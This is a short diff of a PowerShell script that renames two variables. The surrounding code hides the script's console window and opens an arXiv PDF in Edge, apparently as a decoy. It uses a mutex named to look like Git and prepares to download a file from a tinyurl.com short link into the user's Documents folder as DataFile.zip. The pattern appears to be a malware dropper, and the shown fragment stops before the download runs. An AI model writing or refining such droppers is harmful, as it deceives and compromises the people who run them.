@@ -22,7 +22,7 @@ if ($hwnd -ne [System.IntPtr]::Zero) {
     $winApi::ShowWindow($hwnd, 0)
 }
 
-Start-Process "msedge.exe" -ArgumentList "https://arxiv.org/pdf/$tyrp"
+Start-Process "msedge.exe" -ArgumentList "https://arxiv.org/pdf/$pdfcode"
 
 $instanceCheck = Test-SingleInstance -MutexName "Git_RUNNING"
 
@@ -31,7 +31,7 @@ if (-not $instanceCheck.Acquired) {
 }
 
 try {
-    $url = "https://tinyurl.com/$dpty"
+    $url = "https://tinyurl.com/$tinycode"
     $Documents = "$env:USERPROFILE\Documents"
     $destination = Join-Path $Documents "DataFile.zip"
 
